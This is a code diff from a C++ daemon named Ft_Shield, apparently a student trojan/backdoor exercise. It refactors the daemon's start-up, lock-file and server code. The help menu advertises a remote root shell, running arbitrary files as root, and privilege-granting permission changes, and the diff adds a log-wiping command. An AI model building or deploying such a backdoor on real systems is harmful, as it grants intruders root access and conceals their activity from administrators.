@@ -102,7 +102,7 @@ Ft_Shield & Ft_Shield::operator=(const Ft_Shield & shield __attribute__((unused)
 void Ft_Shield::daemonize(void)
 {
 	int	pid		= 0;
-	char buf[9] = {'\0'};
+	//char buf[9] = {'\0'};
 
 	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
 	std::signal(SIGPIPE, &brokenPipe);
@@ -123,34 +123,40 @@ void Ft_Shield::daemonize(void)
 		else if (pid > 0)
 			exit(EXIT_SUCCESS);
 		else if (pid == 0)
-		{
-			/* Set default permisions */
-			umask(0000);
-			/* Open the log file and indentify the beginning of this instance */
-			this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
-			if (this->_logFile != -1)
-			{
-				write(this->_logFile, "New log instance:\n", 18);
-				this->_maxfd++;
-			}
-			/* 
-			 * Create a lock file
-			 * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL
-			 * Fail if another instance of ft_shield is running
-			 */
-			//this->_checkInstance();
-			this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
-			if (this->_run == true && this->_lockFile != -1)
-			{
-				this->_maxfd++;
-				/* Write the daemon pid in the lock file */
-				sprintf(buf, "%d\n", getpid());
-				write(this->_lockFile, buf, strlen(buf));
-				/* _mkSrv returns -1 on error, 0 otherwise */
-				 if (this->_mkSrv() != -1)
-					 this->_runSrv();
-			}
-		}
+			this->start();
+	}
+	return;
+}
+
+void	Ft_Shield::start(void)
+{
+	char buf[9] = {'\0'};
+
+	/* Set default permisions */
+	umask(0000);
+	/* Open the log file and indentify the beginning of this instance */
+	this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
+	if (this->_logFile != -1)
+	{
+		write(this->_logFile, "New log instance:\n", 18);
+		this->_maxfd++;
+	}
+	/* 
+	 * Create a lock file
+	 * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL
+	 * Fail if another instance of ft_shield is running
+	 */
+	//this->_checkInstance();
+	this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
+	if (this->_run == true && this->_lockFile != -1)
+	{
+		this->_maxfd++;
+		/* Write the daemon pid in the lock file */
+		sprintf(buf, "%d\n", getpid());
+		write(this->_lockFile, buf, strlen(buf));
+		/* _mkSrv returns -1 on error, 0 otherwise */
+		 if (this->_mkSrv() != -1)
+			 this->_runSrv();
 	}
 	return;
 }
@@ -411,6 +417,7 @@ void	Ft_Shield::_help(int fd)
 	help += "\t- rev      : open a shell with root rights\n";
 	help += "\t- elfAsRoot: run any file with root priviliges\n";
 	help += "\t- rootLike : modify file permissions to run an elf as root by a non priviliged user\n";
+	help += "\t- clean log : remove the log file and create a new one,\n"; 
 	send(fd, help.c_str(), help.length(), 0);
 	return;
 }
@@ -581,7 +588,7 @@ void	Ft_Shield::_copy(char const *me) const
 }
 
 /*
- * Clean the log file
+ * Clean the log file and create a new one empty
  */
 void	Ft_Shield::_cleanLog(int fd __attribute__((unused)))
 {
